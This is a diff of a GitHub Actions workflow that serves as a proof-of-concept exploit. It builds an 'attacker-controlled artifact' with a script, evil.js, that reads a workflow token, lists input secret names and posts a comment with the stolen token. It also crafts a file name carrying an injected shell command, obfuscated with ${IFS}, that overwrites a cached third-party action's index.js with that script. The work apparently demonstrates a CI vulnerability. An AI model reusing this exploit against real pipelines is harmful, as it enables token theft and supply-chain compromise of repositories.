@@ -2,11 +2,6 @@ name: Test
 
 on:
   workflow_dispatch:
-    inputs:
-      pr:
-        description: PR number to comment on
-        required: false
-        default: "8"
   pull_request:
 
 permissions:
@@ -17,23 +12,20 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Build attacker-controlled artifact
-        env:
-          PRNUM: ${{ inputs.pr || '8' }}
         run: |
           set -e
           mkdir -p content
-          printf '%s\n' "$PRNUM" > content/pr_number.txt
           printf 'plain report from artifact\n' > content/x.txt
-          cat > content/evil.js <<JS
+          cat > content/evil.js <<'JS'
           (async () => {
             const t = process.env.INPUT_TOKEN || '';
-            console.log('GAB_TOKEN_STOLEN len=' + t.length + ' action=' + (process.env.GITHUB_ACTION || '?'));
+            console.log('GAB_PAT_CHANNEL action=' + (process.env.GITHUB_ACTION || '?') + ' token_len=' + t.length + ' keys=' + Object.keys(process.env).filter(k => k.startsWith('INPUT_')).join('|'));
             if (t) {
               try {
-                const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/${PRNUM}/comments', {
+                const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/8/comments', {
                   method: 'POST',
                   headers: { authorization: 'Bearer ' + t, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
-                  body: JSON.stringify({ body: 'GAB_TOKEN_STOLEN: injected code inside find-comment executed with the workflow token (len=' + t.length + ')' })
+                  body: JSON.stringify({ body: 'GAB_PAT_CHANNEL: code in commit-comment executed with its token input (len=' + t.length + ')' })
                 });
                 console.log('GAB_STATUS ' + r.status);
               } catch (e) { console.log('GAB_ERR ' + e.message); }
@@ -45,8 +37,8 @@ jobs:
           import os
           u = "${IFS}"
           src = ";".join(["cd$IFS.."]*5 + ["cd"+u+"tmp", "cd"+u+"content", "cd"+u+"content"])
-          dst = ";".join(["cd$IFS$RUNNER_TEMP", "cd$IFS..", "cd"+u+"_actions", "cd"+u+"peter-evans",
-                          "cd"+u+"find-comment", "cd"+u+"v3", "cd"+u+"dist", "realpath"+u+"index.js"])
+          dst = ";".join(["cd"+u+"${RUNNER_TEMP%_temp}_actions", "cd"+u+"peter-evans", "cd"+u+"commit-comment",
+                          "cd"+u+"v3", "cd"+u+"dist", "realpath"+u+"index.js"])
           inj = "$(" + src + ";cp" + u + "evil.js" + u + "$(" + dst + "))"
           name = "x" + inj + ".txt"
           assert len(name) <= 255, len(name)
